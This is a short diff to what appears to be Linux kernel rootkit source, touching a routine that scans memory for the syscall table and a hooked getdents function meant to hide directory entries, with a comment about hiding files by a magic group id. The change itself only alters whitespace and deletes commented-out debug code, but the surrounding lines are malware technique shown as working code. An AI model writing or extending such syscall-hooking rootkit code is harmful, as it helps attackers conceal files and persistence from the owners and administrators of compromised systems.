@@ -46,7 +46,8 @@ unsigned int **find() { //finds the syscall table, not exported as of 2.6 (32bit
     return NULL;
 }
 #else
-unsigned long long *syscall_table; 
+unsigned long long *syscall_table;
+ 
 unsigned long long  **find() { //same as above but 64bit
 	unsigned long long **sctable;
 	unsigned long long int i = START_MEM;
@@ -123,11 +124,7 @@ asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned
             d->d_reclen=(d->d_reclen+nd->d_reclen);
         }
         //want to somehow get the gid of the current dirent. if == 0x31337 then hide
-        // get struct file then ->f_dentry->d_inode
-        /*struct file* filp;
-        filp=filp_open(nd->d_name,0,0);
-        printk("%d\n",filp->f_dentry->d_inode->i_gid);
-        filp_close(filp,NULL);*/ //causes kernel NULL pointer deref
+        //get struct file then ->f_dentry->d_inode
         bpos += d->d_reclen; //next
     }
     copy_to_user(dirp,(struct linux_dirent *)buf,sizeof(buf)); //now put it back to userspace
